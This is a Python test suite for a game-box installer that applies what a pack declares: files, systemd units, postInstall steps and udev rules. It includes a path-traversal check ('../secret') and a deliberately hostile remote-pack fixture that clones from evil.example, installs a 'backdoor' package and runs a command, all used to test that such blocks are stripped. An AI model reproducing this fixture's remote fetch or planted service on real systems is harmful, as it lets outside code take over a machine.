"""Applying what a pack declares: files, services, postInstall, sources.

The blocks tested here replace ~230 hand-written lines of install/arch.sh. Every
assertion is a behaviour that block had and that the declaration has to keep —
losing one silently is the risk this file exists to remove.

The one that started it: catalog/<app>/files/ and install/firefox-profiles/ both
held the Firefox user.js, a refactor deleted the second, and nothing noticed
until a fresh box died at 66 %. A pack declaring a file it does not carry is now
a failed Result, not an exception and not a missing tile nobody mentions.
"""
from __future__ import annotations

import json
import sys
from dataclasses import dataclass
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT))

from backend.services.catalog import load_catalog                       # noqa: E402
from backend.services.installer import AppContext, apply, enabled_units   # noqa: E402
from backend.services.installer import applier as ap                      # noqa: E402

CATALOG = ROOT / "catalog"
LOCAL = ROOT / "config" / "catalog.d"


@dataclass
class StubPack:
    id: str
    data: dict
    path: Path


def make_pack(tmp_path: Path, data: dict, files: dict[str, str] | None = None) -> StubPack:
    d = tmp_path / "pack"
    d.mkdir(exist_ok=True)
    for rel, content in (files or {}).items():
        target = d / rel
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(content)
    return StubPack(id=data.get("id", "test"), data=data, path=d)


@pytest.fixture
def ctx(tmp_path):
    home = tmp_path / "home"
    home.mkdir()
    return AppContext(gamecore_path=tmp_path / "gc", user="", user_home=home,
                      secrets={})


# ── files ──────────────────────────────────────────────────────────────────

def test_a_declared_file_the_pack_does_not_carry_fails_loudly(tmp_path, ctx):
    """The 66 % bug. Nothing raises, nothing installs, and the message names
    the file — the old shell `install` aborted the entire run instead."""
    pack = make_pack(tmp_path, {"files": [{"src": "files/gone.js", "dest": str(tmp_path / "out.js")}]})
    results = ap.apply_files(pack, ctx)
    assert [r.ok for r in results] == [False]
    assert "gone.js" in results[0].message
    assert not (tmp_path / "out.js").exists()


@pytest.mark.linux_until_port(11)
def test_tokens_expand_in_dest_and_in_templates(tmp_path, ctx):
    ctx.secrets = {"TWITCH_CLIENT_ID": "abc", "TWITCH_CLIENT_SECRET": "s3cret"}
    pack = make_pack(tmp_path, {
        "secrets": [{"key": "TWITCH_CLIENT_ID", "label": "x"},
                    {"key": "TWITCH_CLIENT_SECRET", "label": "y"}],
        "files": [{"template": "files/c.tmpl", "dest": "@HOME@/cfg.json", "mode": "600"}],
    }, {"files/c.tmpl": '{"id":"@TWITCH_CLIENT_ID@","secret":"@TWITCH_CLIENT_SECRET@"}'})
    assert all(r.ok for r in ap.apply_files(pack, ctx))
    written = json.loads((ctx.user_home / "cfg.json").read_text())
    assert written == {"id": "abc", "secret": "s3cret"}
    assert oct((ctx.user_home / "cfg.json").stat().st_mode)[-3:] == "600"


def test_when_picks_between_the_real_config_and_the_demo(tmp_path, ctx):
    """One pack ships both and the condition chooses — which is what removed the
    `if [[ -n "$TWITCH_CLIENT_ID" ]]` branch from the installer."""
    data = {
        "secrets": [{"key": "TWITCH_CLIENT_ID", "label": "x"}],
        "files": [
            {"src": "files/real", "dest": "@HOME@/out", "when": "secrets.TWITCH_CLIENT_ID"},
            {"src": "files/demo", "dest": "@HOME@/out", "when": "!secrets.TWITCH_CLIENT_ID"},
        ],
    }
    pack = make_pack(tmp_path, data, {"files/real": "REAL", "files/demo": "DEMO"})

    ctx.secrets = {"TWITCH_CLIENT_ID": "abc"}
    ap.apply_files(pack, ctx)
    assert (ctx.user_home / "out").read_text() == "REAL"

    (ctx.user_home / "out").unlink()
    ctx.secrets = {"TWITCH_CLIENT_ID": ""}
    ap.apply_files(pack, ctx)
    assert (ctx.user_home / "out").read_text() == "DEMO"


def test_if_absent_does_not_overwrite_a_hand_edited_file(tmp_path, ctx):
    """Re-running the installer is documented as safe. For the demo EmberTV
    config — the one the owner is told to edit — safe has to mean untouched."""
    pack = make_pack(tmp_path, {
        "files": [{"src": "files/demo", "dest": "@HOME@/cfg", "ifAbsent": True}],
    }, {"files/demo": "SHIPPED"})
    (ctx.user_home / "cfg").write_text("MINE")
    results = ap.apply_files(pack, ctx)
    assert (ctx.user_home / "cfg").read_text() == "MINE"
    assert results[0].already


def test_a_pack_cannot_read_outside_its_own_directory(tmp_path, ctx):
    """"Drop a directory" must not become "read the rest of the disk"."""
    secret = tmp_path / "secret"
    secret.write_text("nope")
    pack = make_pack(tmp_path, {
        "files": [{"src": "../secret", "dest": str(tmp_path / "leak")}],
    })
    results = ap.apply_files(pack, ctx)
    assert [r.ok for r in results] == [False]
    assert "outside the pack" in results[0].message
    assert not (tmp_path / "leak").exists()


# ── services ───────────────────────────────────────────────────────────────

@pytest.mark.linux_until_port(11)
def test_an_enabled_unit_is_installed_and_wanted_by_default_target(tmp_path, ctx):
    pack = make_pack(tmp_path, {
        "services": [{"unit": "files/app.service", "scope": "user", "enable": True}],
    }, {"files/app.service": "[Service]\nExecStart=/bin/true\n"})
    assert all(r.ok for r in ap.apply_services(pack, ctx))
    unit = ctx.unit_dir / "app.service"
    link = ctx.unit_dir / "default.target.wants" / "app.service"
    assert unit.is_file()
    assert link.is_symlink()
    # Relative, so the tree survives being moved with the home directory.
    assert str(link.readlink()) == "../app.service"


def test_enabled_units_are_reported_so_the_caller_can_restart_them(tmp_path, ctx):
    """A hand-symlinked user unit is invisible to a running user manager until a
    daemon-reload. Without this list the services sit dead until the next boot,
    on a box the installer has just called ready."""
    pack = make_pack(tmp_path, {"services": [
        {"unit": "files/a.service", "scope": "user", "enable": True},
        {"unit": "files/b.service", "scope": "user", "enable": False},
    ]})
    assert enabled_units(pack, ctx) == ["a.service"]


@pytest.mark.linux_until_port(11)
def test_reinstalling_over_an_existing_symlink_is_not_an_error(tmp_path, ctx):
    pack = make_pack(tmp_path, {
        "services": [{"unit": "files/app.service", "scope": "user", "enable": True}],
    }, {"files/app.service": "[Service]\n"})
    assert all(r.ok for r in ap.apply_services(pack, ctx))
    assert all(r.ok for r in ap.apply_services(pack, ctx))


# ── postInstall ────────────────────────────────────────────────────────────

@pytest.mark.usefixtures("posix_boundary")
def test_a_failing_step_is_a_warning_and_never_an_exception(tmp_path, ctx):
    """The schema says a postInstall failure never interrupts the install. The
    Xenia block once aborted the whole run at 52 %."""
    pack = make_pack(tmp_path, {
        "postInstall": [{"run": "steps/no.sh", "label": "boom"}],
    }, {"steps/no.sh": "echo 'it broke' >&2\nexit 1\n"})
    results = ap.run_post_install(pack, ctx)
    assert [r.ok for r in results] == [False]
    assert "boom" in results[0].message


@pytest.mark.linux_until_port(11)
def test_a_step_that_hangs_is_bounded_by_its_timeout(tmp_path, ctx):
    pack = make_pack(tmp_path, {
        "postInstall": [{"run": "steps/hang.sh", "label": "hang", "timeoutSec": 1}],
    }, {"steps/hang.sh": "sleep 30\n"})
    results = ap.run_post_install(pack, ctx)
    assert [r.ok for r in results] == [False]
    assert "timed out" in results[0].message


@pytest.mark.linux_until_port(11)
def test_a_step_receives_the_tokens_as_environment(tmp_path, ctx):
    ctx.secrets = {"TWITCH_CLIENT_ID": "abc"}
    pack = make_pack(tmp_path, {
        "secrets": [{"key": "TWITCH_CLIENT_ID", "label": "x"}],
        "postInstall": [{"run": "steps/env.sh", "label": "env"}],
    }, {"steps/env.sh": f'printf "%s" "$HOME/$TWITCH_CLIENT_ID" > {tmp_path}/seen\n'})
    assert all(r.ok for r in ap.run_post_install(pack, ctx))
    assert (tmp_path / "seen").read_text() == f"{ctx.user_home}/abc"


@pytest.mark.linux_until_port(11)
def test_steps_run_in_declaration_order(tmp_path, ctx):
    """Generate a certificate, then trust it. The order is the whole point."""
    pack = make_pack(tmp_path, {"postInstall": [
        {"run": "steps/one.sh", "label": "one"},
        {"run": "steps/two.sh", "label": "two"},
    ]}, {"steps/one.sh": f'echo one >> {tmp_path}/order\n',
         "steps/two.sh": f'echo two >> {tmp_path}/order\n'})
    ap.run_post_install(pack, ctx)
    assert (tmp_path / "order").read_text().split() == ["one", "two"]


# ── the shipped app packs ──────────────────────────────────────────────────

@pytest.fixture(scope="module")
def packs():
    return load_catalog(CATALOG, LOCAL)


def test_every_pack_carries_everything_it_declares(packs):
    """The check the repository did not have. catalog/twitch/pack.json declared
    six payload files and shipped one; the five missing ones only surfaced as a
    dead install on a fresh machine, at 66 %.

    Every pack, not just the apps: an emulator may declare the same blocks, and
    "nobody does that yet" is what made the last gap invisible for months."""
    broken = {}
    for pack in packs.values():
        declared = (
            [f.get("src") or f["template"] for f in pack.data.get("files", [])]
            + [s["unit"] for s in pack.data.get("services", [])]
            + [s["run"] for s in pack.data.get("postInstall", [])]
        )
        missing = [rel for rel in declared if not (pack.path / rel).is_file()]
        if missing:
            broken[pack.id] = missing
    assert not broken, f"packs declaring files they do not carry: {broken}"


def test_each_app_pack_declares_something_to_do(packs):
    """An app that declares nothing installs nothing — and the wizard would
    still offer its tick box. Every app in the catalogue, not a list of four."""
    # A Windows pack (steam: the player installs Steam) never goes through this Linux applier.
    idle = [p.id for p in packs.values() if p.kind == "app" and not p.data.get("windows")
            and not any(p.data.get(k) for k in
                        ("install", "sources", "files", "services", "postInstall", "packages"))]
    assert not idle, f"apps that declare no install work at all: {idle}"

def test_the_app_packs_apply_end_to_end_without_touching_the_system(packs, tmp_path):
    """A dry run reaches every block of every app pack. It is what would have
    caught the deleted user.js at build time rather than at 66 % on a box."""
    ctx = AppContext(gamecore_path=tmp_path, user="", dry_run=True,
                     user_home=tmp_path, secrets={"TWITCH_CLIENT_ID": "abc"})
    for pack in (p for p in packs.values() if p.kind == "app" and not p.data.get("windows")):
        results = apply(pack, ctx)
        assert results, f"{pack.id} applied nothing at all"
        assert all(r.ok for r in results), \
            [r.message for r in results if not r.ok]


# ── nothing the applier does may arrive over the network ───────────────────

def test_a_remote_pack_reaches_the_applier_with_nothing_to_apply(tmp_path, ctx):
    """The seam between the OTA catalogue and everything that touches the box.

    Every block this module acts on writes files, installs packages, clones
    repositories, enables units or runs commands. Those are precisely the
    powers a signed remote catalogue must not have: a signature says who sent
    the bundle, not that they were careful, and the endpoint is one DNS or TLS
    compromise from belonging to somebody else.

    `ota.apply_bundle` strips them on arrival and `loader` strips them again on
    read. This asserts the result at the far end, where it actually matters —
    the two strips could both be removed by someone who only grepped for
    "FORBIDDEN_BLOCKS" and never came here.
    """
    from backend.services.catalog import Pack
    from backend.services.catalog.ota import FORBIDDEN_BLOCKS

    # No `install` block: `apply()` would hand it to the flatpak provider, and
    # this suite must never install, uninstall or override anything for real.
    # The provider is covered in test_installer_providers.py, with doubles.
    hostile = {
        "id": "probe", "kind": "app", "label": "Probe", "platform": "probe",
        "color": "#000000", "launch": {"path": "flatpak", "args": "run @APPID@"},
        "postInstall": [{"run": "touch " + str(tmp_path / "pwned")}],
        "services": [{"unit": "evil.service", "scope": "user", "enable": True}],
        "packages": {"pacman": ["backdoor"]},
        "sources": [{"git": "https://evil.example/x", "dest": "lib/x"}],
        "files": [{"src": "a", "dest": str(tmp_path / "written")}],
    }
    # What the loader hands downstream for a pack read out of the OTA tier.
    from backend.services.catalog.loader import _strip_privileged
    data = dict(hostile)
    _strip_privileged(data, "probe")
    for block in FORBIDDEN_BLOCKS:
        data.pop(block, None)

    pack = Pack(id="probe", data=data, path=tmp_path / "pack", origin="remote")
    pack.path.mkdir(exist_ok=True)

    results = apply(pack, ctx)

    assert all(r.ok for r in results), [r.message for r in results if not r.ok]
    assert enabled_units(pack, ctx) == []
    assert not (tmp_path / "pwned").exists(), "a remote pack ran a command"
    assert not (tmp_path / "written").exists(), "a remote pack wrote a file"
    assert pack.generator is None, "a remote pack contributed executable code"


# ── udev ───────────────────────────────────────────────────────────────────
#
# Every test here points `udev_rules_dir` at tmp_path. Nothing in this suite may
# write into the real /etc/udev/rules.d — that would need root, so the honest
# alternative was a skipped test, and a skipped test is how rule generation
# ships never having been run.

USB_ADAPTER = {
    "vidPid": "057e:0337",
    "class": "adapter",
    "label": "GameCube adapter",
    "udevRule": 'ATTRS{idVendor}=="057e", ATTRS{idProduct}=="0337", MODE="0666"',
    "note": "Check the switch is on Wii U.",
}


def test_a_declared_usb_device_gets_its_rule_written(tmp_path, ctx):
    ctx.udev_rules_dir = tmp_path / "rules.d"
    pack = make_pack(tmp_path, {"id": "gc", "usb": [USB_ADAPTER]})
    results = ap.apply_udev(pack, ctx)
    assert [r.ok for r in results] == [True]
    written = (ctx.udev_rules_dir / "99-gamecore-gc.rules").read_text()
    assert USB_ADAPTER["udevRule"] in written
    # Traceable back to the pack, or nobody will dare delete it later.
    assert "gc" in written and "GameCube adapter" in written


def test_the_rules_file_is_named_after_the_pack(tmp_path, ctx):
    """One file per pack, never appended to a shared one.

    Appending has no idempotent form — re-running the installer would grow the
    file every time — and a pack has to be able to take its own rules away.
    """
    ctx.udev_rules_dir = tmp_path / "rules.d"
    ap.apply_udev(make_pack(tmp_path, {"id": "wheelpack", "usb": [USB_ADAPTER]}), ctx)
    assert [p.name for p in ctx.udev_rules_dir.iterdir()] == ["99-gamecore-wheelpack.rules"]


def test_re_running_the_installer_does_not_grow_the_rules_file(tmp_path, ctx):
    """Re-running an install is documented as safe. A rules file that gained a
    duplicate block per run would be the counter-example."""
    ctx.udev_rules_dir = tmp_path / "rules.d"
    pack = make_pack(tmp_path, {"id": "gc", "usb": [USB_ADAPTER]})
    ap.apply_udev(pack, ctx)
    first = (ctx.udev_rules_dir / "99-gamecore-gc.rules").read_text()
    ap.apply_udev(pack, ctx)
    assert (ctx.udev_rules_dir / "99-gamecore-gc.rules").read_text() == first


def test_a_pack_with_no_usb_block_writes_no_rules_at_all(tmp_path, ctx):
    """An empty rules file is a permission question nobody asked."""
    ctx.udev_rules_dir = tmp_path / "rules.d"
    assert ap.apply_udev(make_pack(tmp_path, {"id": "plain"}), ctx) == []
    assert not ctx.udev_rules_dir.exists()


def test_a_device_declaring_no_rule_writes_no_rules_file(tmp_path, ctx):
    """Plenty of peripherals work on kernel defaults. Declaring one must not
    widen a permission on its account."""
    ctx.udev_rules_dir = tmp_path / "rules.d"
    no_rule = {k: v for k, v in USB_ADAPTER.items() if k != "udevRule"}
    assert ap.apply_udev(make_pack(tmp_path, {"id": "gc", "usb": [no_rule]}), ctx) == []
    assert not ctx.udev_rules_dir.exists()


def test_a_dry_run_writes_nothing_and_says_where_it_would_have(tmp_path, ctx):
    ctx.udev_rules_dir = tmp_path / "rules.d"
    ctx.dry_run = True
    results = ap.apply_udev(make_pack(tmp_path, {"id": "gc", "usb": [USB_ADAPTER]}), ctx)
    assert [r.ok for r in results] == [True]
    assert "99-gamecore-gc.rules" in results[0].message
    assert not ctx.udev_rules_dir.exists()


def test_an_unwritable_rules_dir_costs_the_rule_and_not_the_install(tmp_path, ctx):
    """The non-root install. The emulator still installs and still runs; what
    the owner loses is an accessory that may need a manual step. An exception
    here would have cost them the whole pack instead."""
    blocked = tmp_path / "blocked"
    blocked.write_text("I am a file, not a directory")
    ctx.udev_rules_dir = blocked / "rules.d"
    results = ap.apply_udev(make_pack(tmp_path, {"id": "gc", "usb": [USB_ADAPTER]}), ctx)
    assert [r.ok for r in results] == [False]
    assert "gc" in results[0].message


def test_apply_runs_the_udev_step_as_part_of_the_pack(tmp_path, ctx):
    """Wired into apply(), not merely importable — the step existed and was
    never called is the failure this catches."""
    ctx.udev_rules_dir = tmp_path / "rules.d"
    ap.apply(make_pack(tmp_path, {"id": "gc", "usb": [USB_ADAPTER]}), ctx)
    assert (ctx.udev_rules_dir / "99-gamecore-gc.rules").is_file()


def test_apply_udev_never_activates_anything(tmp_path, ctx, monkeypatch):
    """Written, never triggered. Reloading per pack would re-fire the whole
    device tree a dozen times during one install, and the rules matter at the
    next plug event anyway. `install/arch.sh` reloads once, at the end."""
    calls = []
    monkeypatch.setattr(ap.subprocess, "run",
                        lambda *a, **k: calls.append(a) or (_ for _ in ()).throw(
                            AssertionError("apply_udev must not run a subprocess")))
    ctx.udev_rules_dir = tmp_path / "rules.d"
    ap.apply_udev(make_pack(tmp_path, {"id": "gc", "usb": [USB_ADAPTER]}), ctx)
    assert calls == []
